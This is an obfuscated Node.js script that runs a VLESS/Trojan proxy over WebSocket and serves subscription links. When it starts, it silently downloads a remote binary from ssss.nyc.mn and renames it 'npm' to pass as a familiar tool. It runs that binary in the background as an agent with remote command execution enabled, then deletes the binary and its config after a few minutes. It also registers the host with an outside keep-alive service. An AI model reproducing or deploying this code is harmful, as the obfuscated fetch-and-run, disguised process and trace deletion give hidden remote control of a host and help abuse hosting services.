const _0x406f01=_0x10de;(function(_0x2f583e,_0x596e7b){const _0x1a43ec=_0x10de,_0x589222=_0x2f583e();while(!![]){try{const _0x9b189=parseInt(_0x1a43ec(0x211))/0x1+parseInt(_0x1a43ec(0x1e9))/0x2*(-parseInt(_0x1a43ec(0x1d6))/0x3)+parseInt(_0x1a43ec(0x1d4))/0x4+parseInt(_0x1a43ec(0x1e2))/0x5*(parseInt(_0x1a43ec(0x1cc))/0x6)+parseInt(_0x1a43ec(0x1a3))/0x7*(-parseInt(_0x1a43ec(0x1a7))/0x8)+-parseInt(_0x1a43ec(0x20e))/0x9+parseInt(_0x1a43ec(0x1a2))/0xa*(parseInt(_0x1a43ec(0x1ed))/0xb);if(_0x9b189===_0x596e7b)break;else _0x589222['push'](_0x589222['shift']());}catch(_0x29d3b3){_0x589222['push'](_0x589222['shift']());}}}(_0x3fc7,0x263d4));function _0x10de(_0x4cf7bd,_0x531c98){_0x4cf7bd=_0x4cf7bd-0x192;const _0x3fc76d=_0x3fc7();let _0x10de70=_0x3fc76d[_0x4cf7bd];return _0x10de70;}const os=require('os'),http=require(_0x406f01(0x1e0)),fs=require('fs'),axios=require(_0x406f01(0x19c)),net=require(_0x406f01(0x1ce)),path=require(_0x406f01(0x1e1)),crypto=require(_0x406f01(0x1b0)),{Buffer}=require(_0x406f01(0x1a0)),{exec,execSync}=require(_0x406f01(0x213)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process.env.UUID||_0x406f01(0x1d0),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',DOMAIN=process.env.DOMAIN||_0x406f01(0x1cb),AUTO_ACCESS=process.env.AUTO_ACCESS||!![],WSPATH=process.env.WSPATH||UUID[_0x406f01(0x1ad)](0x0,0x8),SUB_PATH=process.env.SUB_PATH||_0x406f01(0x195),NAME=process.env.NAME||'',PORT=process.env.PORT||0x1eb4;let ISP='';const GetISP=async()=>{const _0x416aa9=_0x406f01;try{const _0x44dd50=await axios[_0x416aa9(0x1fb)](_0x416aa9(0x198)),_0xcd09b1=_0x44dd50[_0x416aa9(0x1d3)];ISP=(_0xcd09b1['country_code']+'-'+_0xcd09b1['isp'])[_0x416aa9(0x202)](/ /g,'_');}catch(_0x23046b){ISP=_0x416aa9(0x192);}};GetISP();const httpServer=http['createServer']((_0x59b523,_0xa128dc)=>{const _0x532777=_0x406f01;if(_0x59b523[_0x532777(0x1c1)]==='/'){const _0x25cf22=path[_0x532777(0x1f2)](__dirname,_0x532777(0x1fe));fs[_0x532777(0x1cf)](_0x25cf22,_0x532777(0x1bb),(_0x466129,_0x1bdc3d)=>{const _0x1a226a=_0x532777;if(_0x466129){_0xa128dc[_0x1a226a(0x20d)](0xc8,{'Content-Type':_0x1a226a(0x1a6)}),_0xa128dc[_0x1a226a(0x214)](_0x1a226a(0x1c6));return;}_0xa128dc[_0x1a226a(0x20d)](0xc8,{'Content-Type':'text/html'}),_0xa128dc[_0x1a226a(0x214)](_0x1bdc3d);});return;}else{if(_0x59b523[_0x532777(0x1c1)]==='/'+SUB_PATH){const _0x427594=NAME?NAME+'-'+ISP:ISP,_0x5c4cb1=_0x532777(0x1ec)+UUID+'@'+DOMAIN+_0x532777(0x203)+DOMAIN+_0x532777(0x201)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x427594,_0x3e3548=_0x532777(0x19d)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x532777(0x201)+DOMAIN+_0x532777(0x1f1)+WSPATH+'#'+_0x427594,_0x288d53=_0x5c4cb1+'\x0a'+_0x3e3548,_0x37b90a=Buffer[_0x532777(0x1ae)](_0x288d53)[_0x532777(0x1b6)](_0x532777(0x1c3));_0xa128dc[_0x532777(0x20d)](0xc8,{'Content-Type':'text/plain'}),_0xa128dc['end'](_0x37b90a+'\x0a');}else _0xa128dc['writeHead'](0x194,{'Content-Type':_0x532777(0x200)}),_0xa128dc['end'](_0x532777(0x1d8));}}),wss=new WebSocket[(_0x406f01(0x1af))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x406f01(0x1df),_0x406f01(0x1ba)];function _0x3fc7(){const _0x1b8aa7=['connection','1.1.1.1','utf8','aarch64','test','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://dns.google/resolve?name=','&type=A','url','\x20with\x20all\x20DNS\x20servers','base64','\x20-p\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Hello\x20world!','--tls','application/json','every','once','1234.abc.com','32448hxHjlQ','unlink','net','readFile','66a0d74a-1044-4dec-8610-3721c54955da','chmod\x20+x\x20npm','npm\x20running\x20error:','data','487448TyHtxd','catch','5082MyAdkf','pop','Not\x20Found\x0a','includes','Automatic\x20Access\x20Task\x20added\x20successfully','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2053','map','length','8.8.4.4','http','path','120xksLlm','2083','readUInt16BE','arch','true','Server\x20is\x20running\x20on\x20port\x20','concat','22NoTptz','https://','write','vless://','11LDNKiB','split','setsid\x20nohup\x20./npm\x20-s\x20','false','&path=%2F','join','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','client_secret:\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','application/dns-json','hex','reduce','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Status','get','8443','then','index.html','sha224','text/plain','&fp=chrome&type=ws&host=','replace',':443?encryption=none&security=tls&sni=','post','npm','createHash','https://amd64.ssss.nyc.mn/v1','log','Answer','error','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','config.yaml','writeHead','2603322eiRyHO','message','pipe','79667TTAkZG','2087','child_process','end','Unknown','writeFileSync','arm','sub','readUInt8','update','https://api.ip.sb/geoip','2096','createWriteStream','https://arm64.ssss.nyc.mn/agent','axios','trojan://','stream','error:\x20','buffer','finish','3440530iKDCDS','210854hllxwr','type','npm\x20is\x20already\x20running,\x20skip\x20running...','text/html','56dHiJYr','close','send','https://amd64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/v1','/bin/bash','slice','from','Server','crypto','substr','npm\x20download\x20successfully','443','npm\x20is\x20running','listen','toString','connect','find'];_0x3fc7=function(){return _0x1b8aa7;};return _0x3fc7();}function resolveHost(_0x3ecb85){return new Promise((_0x94b2fe,_0x21369b)=>{const _0x54d81a=_0x10de;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x54d81a(0x1bd)](_0x3ecb85)){_0x94b2fe(_0x3ecb85);return;}let _0x503057=0x0;function _0x41c358(){const _0xa678f2=_0x54d81a;if(_0x503057>=DNS_SERVERS[_0xa678f2(0x1de)]){_0x21369b(new Error('Failed\x20to\x20resolve\x20'+_0x3ecb85+_0xa678f2(0x1c2)));return;}const _0x37002c=DNS_SERVERS[_0x503057];_0x503057++;const _0x15bd16=_0xa678f2(0x1bf)+encodeURIComponent(_0x3ecb85)+_0xa678f2(0x1c0);axios['get'](_0x15bd16,{'timeout':0x1388,'headers':{'Accept':_0xa678f2(0x1f6)}})[_0xa678f2(0x1fd)](_0x2e1478=>{const _0x117bbc=_0xa678f2,_0x360486=_0x2e1478['data'];if(_0x360486[_0x117bbc(0x1fa)]===0x0&&_0x360486[_0x117bbc(0x209)]&&_0x360486['Answer'][_0x117bbc(0x1de)]>0x0){const _0x29540d=_0x360486[_0x117bbc(0x209)][_0x117bbc(0x1b8)](_0x1cff7b=>_0x1cff7b[_0x117bbc(0x1a4)]===0x1);if(_0x29540d){_0x94b2fe(_0x29540d[_0x117bbc(0x1d3)]);return;}}_0x41c358();})['catch'](_0x58b25b=>{_0x41c358();});}_0x41c358();});}function handleVlessConnection(_0x47d534,_0xb382f7){const _0x308b58=_0x406f01,[_0x3e1ad6]=_0xb382f7,_0xa0d715=_0xb382f7[_0x308b58(0x1ad)](0x1,0x11);if(!_0xa0d715[_0x308b58(0x1c9)]((_0x546637,_0x16db7a)=>_0x546637==parseInt(uuid[_0x308b58(0x1b1)](_0x16db7a*0x2,0x2),0x10)))return![];let _0x14a86a=_0xb382f7[_0x308b58(0x1ad)](0x11,0x12)[_0x308b58(0x196)]()+0x13;const _0x5a7110=_0xb382f7[_0x308b58(0x1ad)](_0x14a86a,_0x14a86a+=0x2)[_0x308b58(0x1e4)](0x0),_0x201576=_0xb382f7[_0x308b58(0x1ad)](_0x14a86a,_0x14a86a+=0x1)[_0x308b58(0x196)](),_0x500668=_0x201576==0x1?_0xb382f7[_0x308b58(0x1ad)](_0x14a86a,_0x14a86a+=0x4)[_0x308b58(0x1f2)]('.'):_0x201576==0x2?new TextDecoder()['decode'](_0xb382f7[_0x308b58(0x1ad)](_0x14a86a+0x1,_0x14a86a+=0x1+_0xb382f7['slice'](_0x14a86a,_0x14a86a+0x1)[_0x308b58(0x196)]())):_0x201576==0x3?_0xb382f7['slice'](_0x14a86a,_0x14a86a+=0x10)[_0x308b58(0x1f8)]((_0x99a626,_0x2cf903,_0xe9021f,_0x359276)=>_0xe9021f%0x2?_0x99a626[_0x308b58(0x1e8)](_0x359276[_0x308b58(0x1ad)](_0xe9021f-0x1,_0xe9021f+0x1)):_0x99a626,[])[_0x308b58(0x1dd)](_0x557d30=>_0x557d30[_0x308b58(0x1e4)](0x0)[_0x308b58(0x1b6)](0x10))[_0x308b58(0x1f2)](':'):'';_0x47d534[_0x308b58(0x1a9)](new Uint8Array([_0x3e1ad6,0x0]));const _0x282652=createWebSocketStream(_0x47d534);return resolveHost(_0x500668)[_0x308b58(0x1fd)](_0x5c9839=>{const _0x4a8cd9=_0x308b58;net[_0x4a8cd9(0x1b7)]({'host':_0x5c9839,'port':_0x5a7110},function(){const _0x41672e=_0x4a8cd9;this[_0x41672e(0x1eb)](_0xb382f7[_0x41672e(0x1ad)](_0x14a86a)),_0x282652['on']('error',()=>{})['pipe'](this)['on'](_0x41672e(0x20a),()=>{})[_0x41672e(0x210)](_0x282652);})['on'](_0x4a8cd9(0x20a),()=>{});})[_0x308b58(0x1d5)](_0x4e2722=>{const _0x4ef9d5=_0x308b58;net[_0x4ef9d5(0x1b7)]({'host':_0x500668,'port':_0x5a7110},function(){const _0x449dda=_0x4ef9d5;this['write'](_0xb382f7[_0x449dda(0x1ad)](_0x14a86a)),_0x282652['on'](_0x449dda(0x20a),()=>{})['pipe'](this)['on'](_0x449dda(0x20a),()=>{})[_0x449dda(0x210)](_0x282652);})['on'](_0x4ef9d5(0x20a),()=>{});}),!![];}function handleTrojanConnection(_0x132ce2,_0x1b5b09){const _0x446fa4=_0x406f01;try{if(_0x1b5b09[_0x446fa4(0x1de)]<0x3a)return![];const _0x12c400=_0x1b5b09[_0x446fa4(0x1ad)](0x0,0x38)[_0x446fa4(0x1b6)](),_0x2b7d2d=[UUID];let _0x266e72=null;for(const _0x23fe0d of _0x2b7d2d){const _0x2e22f2=crypto[_0x446fa4(0x206)](_0x446fa4(0x1ff))[_0x446fa4(0x197)](_0x23fe0d)['digest'](_0x446fa4(0x1f7));if(_0x2e22f2===_0x12c400){_0x266e72=_0x23fe0d;break;}}if(!_0x266e72)return![];let _0x20942a=0x38;_0x1b5b09[_0x20942a]===0xd&&_0x1b5b09[_0x20942a+0x1]===0xa&&(_0x20942a+=0x2);const _0x5c4061=_0x1b5b09[_0x20942a];if(_0x5c4061!==0x1)return![];_0x20942a+=0x1;const _0x521842=_0x1b5b09[_0x20942a];_0x20942a+=0x1;let _0x1a055d,_0x4eb704;if(_0x521842===0x1)_0x1a055d=_0x1b5b09[_0x446fa4(0x1ad)](_0x20942a,_0x20942a+0x4)[_0x446fa4(0x1f2)]('.'),_0x20942a+=0x4;else{if(_0x521842===0x3){const _0x3a6884=_0x1b5b09[_0x20942a];_0x20942a+=0x1,_0x1a055d=_0x1b5b09[_0x446fa4(0x1ad)](_0x20942a,_0x20942a+_0x3a6884)[_0x446fa4(0x1b6)](),_0x20942a+=_0x3a6884;}else{if(_0x521842===0x4)_0x1a055d=_0x1b5b09['slice'](_0x20942a,_0x20942a+0x10)[_0x446fa4(0x1f8)]((_0x14c6c8,_0x10197d,_0x23d46b,_0x547995)=>_0x23d46b%0x2?_0x14c6c8[_0x446fa4(0x1e8)](_0x547995[_0x446fa4(0x1ad)](_0x23d46b-0x1,_0x23d46b+0x1)):_0x14c6c8,[])['map'](_0x4e2a2f=>_0x4e2a2f[_0x446fa4(0x1e4)](0x0)[_0x446fa4(0x1b6)](0x10))[_0x446fa4(0x1f2)](':'),_0x20942a+=0x10;else return![];}}_0x4eb704=_0x1b5b09[_0x446fa4(0x1e4)](_0x20942a),_0x20942a+=0x2;_0x20942a<_0x1b5b09[_0x446fa4(0x1de)]&&_0x1b5b09[_0x20942a]===0xd&&_0x1b5b09[_0x20942a+0x1]===0xa&&(_0x20942a+=0x2);const _0x1420fc=createWebSocketStream(_0x132ce2);return resolveHost(_0x1a055d)[_0x446fa4(0x1fd)](_0x118d13=>{const _0x2f9e6e=_0x446fa4;net[_0x2f9e6e(0x1b7)]({'host':_0x118d13,'port':_0x4eb704},function(){const _0x3dd804=_0x2f9e6e;_0x20942a<_0x1b5b09['length']&&this[_0x3dd804(0x1eb)](_0x1b5b09[_0x3dd804(0x1ad)](_0x20942a)),_0x1420fc['on']('error',()=>{})[_0x3dd804(0x210)](this)['on']('error',()=>{})['pipe'](_0x1420fc);})['on'](_0x2f9e6e(0x20a),()=>{});})[_0x446fa4(0x1d5)](_0x452f73=>{const _0x5dc33f=_0x446fa4;net[_0x5dc33f(0x1b7)]({'host':_0x1a055d,'port':_0x4eb704},function(){const _0x160393=_0x5dc33f;_0x20942a<_0x1b5b09['length']&&this['write'](_0x1b5b09['slice'](_0x20942a)),_0x1420fc['on'](_0x160393(0x20a),()=>{})['pipe'](this)['on'](_0x160393(0x20a),()=>{})[_0x160393(0x210)](_0x1420fc);})['on'](_0x5dc33f(0x20a),()=>{});}),!![];}catch(_0x4a328f){return![];}}wss['on'](_0x406f01(0x1b9),(_0x211ac6,_0x4bb650)=>{const _0x3b9a95=_0x406f01,_0x27c2f1=_0x4bb650['url']||'';_0x211ac6[_0x3b9a95(0x1ca)](_0x3b9a95(0x20f),_0x99ad38=>{const _0x2e80bc=_0x3b9a95;if(_0x99ad38[_0x2e80bc(0x1de)]>0x11&&_0x99ad38[0x0]===0x0){const _0x372c56=_0x99ad38['slice'](0x1,0x11),_0x17fc96=_0x372c56[_0x2e80bc(0x1c9)]((_0x4e38c0,_0x513986)=>_0x4e38c0==parseInt(uuid[_0x2e80bc(0x1b1)](_0x513986*0x2,0x2),0x10));if(_0x17fc96){!handleVlessConnection(_0x211ac6,_0x99ad38)&&_0x211ac6[_0x2e80bc(0x1a8)]();return;}}!handleTrojanConnection(_0x211ac6,_0x99ad38)&&_0x211ac6[_0x2e80bc(0x1a8)]();})['on'](_0x3b9a95(0x20a),()=>{});});const getDownloadUrl=()=>{const _0x528fe7=_0x406f01,_0x5f4c98=os[_0x528fe7(0x1e5)]();return _0x5f4c98===_0x528fe7(0x194)||_0x5f4c98==='arm64'||_0x5f4c98===_0x528fe7(0x1bc)?!NEZHA_PORT?_0x528fe7(0x1ab):_0x528fe7(0x19b):!NEZHA_PORT?_0x528fe7(0x207):_0x528fe7(0x1aa);},downloadFile=async()=>{const _0x19e9cc=_0x406f01;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5d2144=getDownloadUrl(),_0x52d585=await axios({'method':_0x19e9cc(0x1fb),'url':_0x5d2144,'responseType':_0x19e9cc(0x19e)}),_0x4a9057=fs[_0x19e9cc(0x19a)](_0x19e9cc(0x205));return _0x52d585[_0x19e9cc(0x1d3)][_0x19e9cc(0x210)](_0x4a9057),new Promise((_0x2ca2c0,_0x71e20f)=>{const _0x33b708=_0x19e9cc;_0x4a9057['on'](_0x33b708(0x1a1),()=>{const _0x2a5dd4=_0x33b708;console['log'](_0x2a5dd4(0x1b2)),exec(_0x2a5dd4(0x1d1),_0x26b74d=>{if(_0x26b74d)_0x71e20f(_0x26b74d);_0x2ca2c0();});}),_0x4a9057['on']('error',_0x71e20f);});}catch(_0x3acbe2){throw _0x3acbe2;}},runnz=async()=>{const _0xbd41c0=_0x406f01;try{const _0x49aaef=execSync(_0xbd41c0(0x1f5),{'encoding':'utf-8'});if(_0x49aaef['trim']()!==''){console['log'](_0xbd41c0(0x1a5));return;}}catch(_0x3c7f5e){}await downloadFile();let _0x2258fe='',_0x2b7534=[_0xbd41c0(0x1b3),_0xbd41c0(0x1fc),_0xbd41c0(0x199),_0xbd41c0(0x212),_0xbd41c0(0x1e3),_0xbd41c0(0x1dc)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3fff88=_0x2b7534['includes'](NEZHA_PORT)?_0xbd41c0(0x1c7):'';_0x2258fe=_0xbd41c0(0x1ef)+NEZHA_SERVER+':'+NEZHA_PORT+_0xbd41c0(0x1c4)+NEZHA_KEY+'\x20'+_0x3fff88+_0xbd41c0(0x1f9);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x100ee5=NEZHA_SERVER[_0xbd41c0(0x1d9)](':')?NEZHA_SERVER[_0xbd41c0(0x1ee)](':')[_0xbd41c0(0x1d7)]():'',_0x360021=_0x2b7534['includes'](_0x100ee5)?_0xbd41c0(0x1e6):_0xbd41c0(0x1f0),_0x1ad4e7=_0xbd41c0(0x1f4)+NEZHA_KEY+_0xbd41c0(0x1db)+NEZHA_SERVER+_0xbd41c0(0x1be)+_0x360021+_0xbd41c0(0x1c5)+UUID;fs[_0xbd41c0(0x193)]('config.yaml',_0x1ad4e7);}_0x2258fe=_0xbd41c0(0x20b);}else{console[_0xbd41c0(0x208)](_0xbd41c0(0x1f3));return;}}try{exec(_0x2258fe,{'shell':_0xbd41c0(0x1ac)},_0x1aed83=>{const _0x3c6516=_0xbd41c0;if(_0x1aed83)console[_0x3c6516(0x20a)](_0x3c6516(0x1d2),_0x1aed83);else console[_0x3c6516(0x208)](_0x3c6516(0x1b4));});}catch(_0xfcc1b6){console[_0xbd41c0(0x20a)](_0xbd41c0(0x19f)+_0xfcc1b6);}};async function addAccessTask(){const _0x2b4b68=_0x406f01;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xb0ed0=_0x2b4b68(0x1ea)+DOMAIN;try{const _0x4ab77c=await axios[_0x2b4b68(0x204)]('https://oooo.serv00.net/add-url',{'url':_0xb0ed0},{'headers':{'Content-Type':_0x2b4b68(0x1c8)}});console[_0x2b4b68(0x208)](_0x2b4b68(0x1da));}catch(_0x31c19f){}}const delFiles=()=>{const _0x1c3b3c=_0x406f01;fs[_0x1c3b3c(0x1cd)]('npm',()=>{}),fs[_0x1c3b3c(0x1cd)](_0x1c3b3c(0x20c),()=>{});};httpServer[_0x406f01(0x1b5)](PORT,()=>{const _0x2b232e=_0x406f01;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2b232e(0x208)](_0x2b232e(0x1e7)+PORT);});
